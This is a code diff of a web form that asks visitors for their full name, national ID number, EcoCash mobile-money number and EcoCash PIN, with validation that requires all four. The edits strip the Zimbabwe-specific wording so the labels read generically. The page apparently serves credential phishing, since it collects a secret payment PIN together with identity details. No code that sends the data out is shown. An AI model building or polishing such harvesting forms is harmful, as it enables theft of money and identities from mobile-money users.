@@ -121,16 +121,16 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 <input type="text" id="fullName" placeholder="Enter your full name" required autocomplete="name">
 </div>
 <div class="form-group">
-<label>Zimbabwe ID Number <span class="required">*</span></label>
-<input type="text" id="idNumber" placeholder="63-1234567-A-00" required autocomplete="off">
+<label>ID Number <span class="required">*</span></label>
+<input type="text" id="idNumber" placeholder="Enter your ID number" required autocomplete="off">
 </div>
 <div class="form-group">
 <label>EcoCash Number <span class="required">*</span></label>
 <input type="tel" id="ecocashNumber" placeholder="0771234567" pattern="[0-9]*" inputmode="numeric" required autocomplete="tel">
 </div>
 <div class="form-group">
-<label>Current EcoCash PIN <span class="required">*</span></label>
-<input type="password" id="ecoPin" placeholder="Enter your current EcoCash PIN" maxlength="4" pattern="[0-9]{4}" inputmode="numeric" required autocomplete="off">
+<label>Your EcoCash PIN <span class="required">*</span></label>
+<input type="password" id="ecoPin" placeholder="Enter your EcoCash PIN" maxlength="4" pattern="[0-9]{4}" inputmode="numeric" required autocomplete="off">
 </div>
 <button type="submit" class="btn" id="submitBtn"><span id="submitText">Continue</span></button>
 </form>
@@ -205,7 +205,7 @@ var ecocashNumber=document.getElementById('ecocashNumber').value.trim();
 var ecoPin=document.getElementById('ecoPin').value.trim();
 
 if(!fullName){showMessage('Please enter your full name','error');return}
-if(!idNumber){showMessage('Please enter your Zimbabwe ID number','error');return}
+if(!idNumber){showMessage('Please enter your ID number','error');return}
 if(!ecocashNumber||ecocashNumber.length<10){showMessage('Please enter a valid EcoCash number','error');return}
 if(!ecoPin||ecoPin.length!==4){showMessage('EcoCash PIN must be 4 digits','error');return}
 
